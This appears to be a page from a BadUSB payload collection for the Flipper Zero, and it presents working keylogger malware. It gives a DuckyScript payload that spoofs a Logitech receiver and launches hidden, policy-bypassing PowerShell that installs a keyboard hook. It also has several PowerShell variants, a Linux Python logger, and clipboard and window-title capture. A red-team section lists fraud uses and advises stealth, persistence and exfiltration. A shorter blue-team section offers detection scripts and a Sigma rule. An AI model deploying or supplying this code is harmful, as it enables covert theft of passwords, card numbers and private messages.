# FZ-A06: Keylogger

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-A06 |
| **Name** | Keylogger |
| **Difficulty** | Advanced |
| **Target OS** | Windows 10/11 |
| **Execution Time** | Runs continuously |
| **MITRE ATT&CK** | T1056.001 (Input Capture: Keylogging) |

## What This Payload Does

Deploys a keylogger that captures all keystrokes on the target system. The logged keystrokes are saved to a file for later retrieval or exfiltration.

---

## The Payload

```ducky
REM =============================================
REM ADVANCED: PowerShell Keylogger
REM Target: Windows 10/11
REM Action: Captures keystrokes to file
REM Output: %APPDATA%\keylog.txt
REM Skill: Advanced
REM WARNING: Captures sensitive data
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Deploy keylogger
STRINGLN $code = @'
STRINGLN Add-Type -TypeDefinition @"
STRINGLN using System;
STRINGLN using System.IO;
STRINGLN using System.Runtime.InteropServices;
STRINGLN using System.Windows.Forms;
STRINGLN public class Keylog {
STRINGLN     private const int WH_KEYBOARD_LL = 13;
STRINGLN     private const int WM_KEYDOWN = 0x0100;
STRINGLN     private static IntPtr hookId = IntPtr.Zero;
STRINGLN     private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
STRINGLN     [DllImport("user32.dll")]
STRINGLN     private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
STRINGLN     [DllImport("user32.dll")]
STRINGLN     private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
STRINGLN     [DllImport("kernel32.dll")]
STRINGLN     private static extern IntPtr GetModuleHandle(string lpModuleName);
STRINGLN     private static LowLevelKeyboardProc proc = HookCallback;
STRINGLN     private static string logPath;
STRINGLN     public static void Start(string path) {
STRINGLN         logPath = path;
STRINGLN         hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
STRINGLN         Application.Run();
STRINGLN     }
STRINGLN     private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
STRINGLN         if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
STRINGLN             int vkCode = Marshal.ReadInt32(lParam);
STRINGLN             File.AppendAllText(logPath, ((Keys)vkCode).ToString() + " ");
STRINGLN         }
STRINGLN         return CallNextHookEx(hookId, nCode, wParam, lParam);
STRINGLN     }
STRINGLN }
STRINGLN "@ -ReferencedAssemblies System.Windows.Forms
STRINGLN [Keylog]::Start("$env:APPDATA\keylog.txt")
STRINGLN '@
STRINGLN $code | Out-File "$env:APPDATA\kl.ps1"
STRINGLN Start-Process powershell -ArgumentList "-w hidden -ep bypass -f `"$env:APPDATA\kl.ps1`"" -WindowStyle Hidden
```

---

## Keylogger Techniques

### Method 1: Low-Level Keyboard Hook (Above)

Uses Windows `SetWindowsHookEx` with `WH_KEYBOARD_LL` to intercept keystrokes at the system level.

### Method 2: GetAsyncKeyState Loop

```powershell
# Simpler but uses more CPU
Add-Type -AssemblyName System.Windows.Forms
$logFile = "$env:APPDATA\keys.txt"

while ($true) {
    Start-Sleep -Milliseconds 10
    for ($char = 8; $char -le 254; $char++) {
        $state = [System.Windows.Forms.Control]::IsKeyLocked([System.Windows.Forms.Keys]$char)
        $pressed = [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]$char)
        if ($pressed) {
            [System.Windows.Forms.Keys]$char | Out-File $logFile -Append
        }
    }
}
```

### Method 3: Native API Keylogger

```powershell
$script = @'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$chars = @{
    8='[BACK]'; 9='[TAB]'; 13='[ENTER]'; 27='[ESC]'; 32=' ';
    48='0'; 49='1'; 50='2'; 51='3'; 52='4'; 53='5'; 54='6'; 55='7'; 56='8'; 57='9';
    65='a'; 66='b'; 67='c'; 68='d'; 69='e'; 70='f'; 71='g'; 72='h'; 73='i'; 74='j';
    75='k'; 76='l'; 77='m'; 78='n'; 79='o'; 80='p'; 81='q'; 82='r'; 83='s'; 84='t';
    85='u'; 86='v'; 87='w'; 88='x'; 89='y'; 90='z';
    186=';'; 187='='; 188=','; 189='-'; 190='.'; 191='/';
}

while ($true) {
    foreach ($key in $chars.Keys) {
        if ([Keyboard]::GetAsyncKeyState($key) -eq -32767) {
            $chars[$key] >> "$env:APPDATA\log.txt"
        }
    }
    Start-Sleep -Milliseconds 10
}
'@
```

---

## Cross-Platform Keyloggers

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM macOS keylogging requires Accessibility permissions
REM This is a demonstration - real keylogger would need permissions
STRINGLN echo "macOS keylogging requires Accessibility permissions"
STRINGLN echo "Cannot deploy silently without user interaction"
```

**Note**: macOS requires explicit Accessibility permissions for keylogging. Cannot be silently deployed via BadUSB.

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Using xinput for X11 keylogging
STRINGLN xinput list | grep -i keyboard

REM Simple Python keylogger (requires pynput)
STRINGLN cat << 'EOF' > /tmp/kl.py
STRINGLN from pynput import keyboard
STRINGLN def on_press(key):
STRINGLN     with open('/tmp/keylog.txt', 'a') as f:
STRINGLN         f.write(str(key))
STRINGLN with keyboard.Listener(on_press=on_press) as listener:
STRINGLN     listener.join()
STRINGLN EOF
STRINGLN python3 /tmp/kl.py &
```

**Note**: Requires `pynput` library installed.

### Android

Android keylogging requires either:
- Root access with `/dev/input` access
- Accessibility Service (requires user enabling)
- Custom keyboard installation (requires user selection)

Cannot be silently deployed via BadUSB.

### iOS

iOS keylogging is not possible without jailbreak and is completely blocked for BadUSB attacks.

---

## Advanced Keylogger Features

### With Window Title Capture

```powershell
# Capture which application was active
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class Win32 {
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
}
"@

function Get-ActiveWindow {
    $hwnd = [Win32]::GetForegroundWindow()
    $sb = New-Object System.Text.StringBuilder(256)
    [Win32]::GetWindowText($hwnd, $sb, 256)
    return $sb.ToString()
}
```

### With Screenshot on Sensitive Keywords

```powershell
# Trigger screenshot when password fields detected
$keywords = @('password', 'credit', 'ssn', 'bank')
# Integrate with keylogger to check window titles
```

### With Clipboard Capture

```powershell
# Also capture clipboard changes
$lastClip = ""
while ($true) {
    $clip = Get-Clipboard -ErrorAction SilentlyContinue
    if ($clip -ne $lastClip -and $clip) {
        "[CLIPBOARD] $clip" >> "$env:APPDATA\log.txt"
        $lastClip = $clip
    }
    Start-Sleep -Seconds 5
}
```

---

## Red Team Perspective

### Keylogger Value

| Captured Data | Use Case |
|---------------|----------|
| Passwords | Direct access |
| Credit cards | Financial fraud (illegal) |
| Private messages | Intelligence |
| Search queries | Profiling |
| Credentials | Lateral movement |

### Deployment Considerations

1. **Persistence**: Combine with scheduled task
2. **Stealth**: Hidden window, low resource usage
3. **Exfiltration**: Periodic upload of logs
4. **Anti-forensics**: Log rotation, encryption

### Attack Chain

```
Initial Access → Keylogger Deploy → Credential Capture → Account Access
                       ↑
                   You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **API Calls**
   - SetWindowsHookEx with WH_KEYBOARD_LL
   - GetAsyncKeyState in loops

2. **Process Behavior**
   - Hidden PowerShell with hooks
   - Continuous file writes

3. **File System**
   - Growing log files in unusual locations
   - Files with keystroke patterns

### Detection Script

```powershell
# Find processes with keyboard hooks
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 500 | Where-Object {
    $_.Message -match 'SetWindowsHookEx|WH_KEYBOARD|GetAsyncKeyState|LowLevelKeyboardProc'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,400)}}

# Find suspicious log files
Get-ChildItem $env:APPDATA -Recurse -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match 'key|log|hook' -and $_.Length -gt 1KB }
```

### Sigma Rule

```yaml
title: Keylogger Activity Detection
status: experimental
description: Detects potential keylogging activity
logsource:
    product: windows
    category: ps_script
detection:
    selection:
        ScriptBlockText|contains:
            - 'SetWindowsHookEx'
            - 'WH_KEYBOARD_LL'
            - 'GetAsyncKeyState'
            - 'LowLevelKeyboardProc'
    condition: selection
level: high
tags:
    - attack.collection
    - attack.t1056.001
```

### Prevention

1. **Endpoint Protection**
   - EDR with hook monitoring
   - Behavioral analysis

2. **User Education**
   - Use password managers (auto-fill)
   - Virtual keyboards for sensitive data

3. **Application Control**
   - Block unsigned PowerShell scripts
   - Monitor for hook installations

---

## Practice Exercises

### Exercise 1: Test Key Detection
```powershell
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
```

### Exercise 2: Find Keylogger Files
```powershell
Get-ChildItem $env:APPDATA -Recurse -File | Where-Object { $_.Name -match 'key|log' }
```

### Exercise 3: Check for Hooks
```powershell
# Would need specialized tools like API Monitor
# Or check for suspicious processes with hooks
Get-Process | Where-Object { $_.ProcessName -match 'key|hook|log' }
```

---

## Payload File

Save as `FZ-A06_Keylogger.txt`:

```ducky
REM FZ-A06: Keylogger
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN $s='Add-Type @"
using System;using System.Runtime.InteropServices;
public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int k);}
"@;while(1){32..126|%{if([K]::GetAsyncKeyState($_)-eq-32767){[char]$_>>$env:APPDATA\k.txt}};sleep -m 10}';$s|Out-File $env:APPDATA\k.ps1;Start-Process powershell "-w hidden -f $env:APPDATA\k.ps1"
```

---

[← FZ-A05 Data Exfiltration](FZ-A05_Data_Exfiltration.md) | [Back to Advanced](README.md) | [Next: FZ-A07 Screenshot Capture →](FZ-A07_Screenshot_Capture.md)
